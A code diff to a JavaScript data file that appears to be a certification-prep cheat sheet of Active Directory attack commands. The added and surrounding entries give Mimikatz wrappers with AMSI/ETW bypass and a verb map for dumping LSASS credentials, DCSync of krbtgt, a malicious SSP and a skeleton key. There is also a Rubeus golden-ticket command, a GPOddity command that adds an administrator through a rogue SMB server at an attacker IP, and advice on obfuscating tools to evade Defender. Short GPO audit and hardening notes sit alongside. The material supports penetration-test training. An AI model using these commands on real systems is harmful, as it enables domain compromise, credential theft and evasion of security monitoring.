@@ -20691,6 +20691,14 @@ const COMMAND_DATA = {
         {
           "label": "Rubeus evasive golden / silver ticket",
           "command": "Loader.exe -path <rubeus_exe> -args evasive-golden /aes256:<aes> /user:Administrator /id:500 /domain:<domain> /sid:<sid> /ptt"
+        },
+        {
+          "label": "Lab evasive Mimikatz wrapper (C:\\AD\\Tools)",
+          "command": "Invoke-MimiEx   # lab-provided PS wrapper: runs Mimikatz with AMSI/ETW bypass baked in"
+        },
+        {
+          "label": "Lab evasive cred wrapper — modify then run",
+          "command": ". C:\\AD\\Tools\\Invoke-TheKatEx-keys-stdX.ps1   # Invoke-TheKat.ps1 with the function call inlined; -vault variant for DPAPI"
         }
       ],
       "notes": "Verb map (evasive- prefix on the CRTP custom build):\n- sekurlsa::evasive-logonpasswords / evasive-keys / evasive-ekeys - creds & Kerberos keys from LSASS (T1003.001)\n- sekurlsa::evasive-pth - pass-the-hash into a new logon session\n- lsadump::evasive-dcsync /user:<domain>\\krbtgt - pull krbtgt/any hash via replication (feeds golden ticket)\n- lsadump::evasive-lsa /patch  |  lsadump::evasive-sam - LSA secrets / local SAM\n- lsadump::evasive-trust /patch - inter-realm trust keys (feeds cross-domain/forest tickets)\n- token::evasive-elevate + vault::cred /patch - elevate then dump Credential Manager/DPAPI vault (scheduled-task creds etc.)\n- misc::memssp - register a malicious SSP so future logons are logged in plaintext to C:\\Windows\\System32\\mimilsa.log (credential-capture persistence)\n- misc::skeleton - skeleton key (see crtp-skeleton-key)\n- crypto::certificates /export - export machine/user certificates (cert theft / PKINIT)\n- Rubeus evasive-golden / evasive-silver - forge tickets in-memory\nAlways run through crtp-loader (ETW/AMSI unhook). If a verb still gets flagged, obfuscate the binary (crtp-tool-obfuscation) and re-check with DefenderCheck.",
@@ -24072,14 +24080,16 @@ const COMMAND_DATA = {
       ],
       "tools": [
         "PowerView",
-        "SharpGPOAbuse"
+        "SharpGPOAbuse",
+        "GPOddity"
       ],
       "tags": [
         "gpo",
         "group-policy",
         "privesc",
         "persistence",
-        "sharpgpoabuse"
+        "sharpgpoabuse",
+        "gpoddity"
       ],
       "steps": [
         {
@@ -24138,7 +24148,13 @@ const COMMAND_DATA = {
         "misconfiguration": "Non-admin groups have write permissions on GPOs (often from legacy delegation or mis-scoped admin roles). No Event 5136 monitoring on GPO objects. GPO DACLs not regularly audited.",
         "vulnerable_config": "# Find GPOs with non-admin write permissions:\nGet-NetGPO | ForEach-Object {\n  $gpo = $_\n  Get-ObjectAcl $gpo.AdsPath -ResolveGUIDs | Where-Object {\n    $_.ActiveDirectoryRights -match 'Write|Create|GenericAll' -and\n    $_.IdentityReference -notmatch 'Domain Admins|CREATOR OWNER|SYSTEM|Enterprise Admins'\n  } | Select-Object @{N='GPO';E={$gpo.DisplayName}},IdentityReference,ActiveDirectoryRights\n}\n# Output: 'IT_Computers_GPO' — CORP\\HelpDesk — WriteProperty → VULNERABLE",
         "secure_config": "# Remove non-admin write ACEs from GPOs:\n# GPMC → right-click GPO → Edit Delegations → remove non-admin edit rights\n\n# Audit GPO DACLs with BloodHound:\n# Cypher: MATCH (g:GPO) WHERE g.owned=true RETURN g.name\n# Or: 'Find GPOs where Domain Users have Modify Rights' built-in query\n\n# Enable Event 5136 on GPO objects:\n# Advanced Audit: DS Access → Audit Directory Service Changes\n# SIEM: EventID=5136 AND ObjectDN contains 'CN=Policies,CN=System' → ALERT\n\n# Change control: require ITSM ticket for GPO modifications\n# Only GPO admins (dedicated group) have write rights — review quarterly"
-      }
+      },
+      "variations": [
+        {
+          "label": "Abuse via GPOddity (Linux/WSL, lab method)",
+          "command": "sudo python3 gpoddity.py --gpo-id '<gpo_id>' --domain '<domain>' --username '<user>' --password '<pass>' --command 'net localgroup administrators <user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share>' --dc-ip '<dc_ip>' --smb-mode none"
+        }
+      ]
     },
     {
       "id": "cdsa-m06-gpp-passwords",
@@ -90977,7 +90993,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 908,
-  "buildDate": "2026-09-08T22:07:54.847Z",
+  "buildDate": "2026-09-08T22:17:37.849Z",
   "certifications": [
     "CDSA",
     "CPTS",
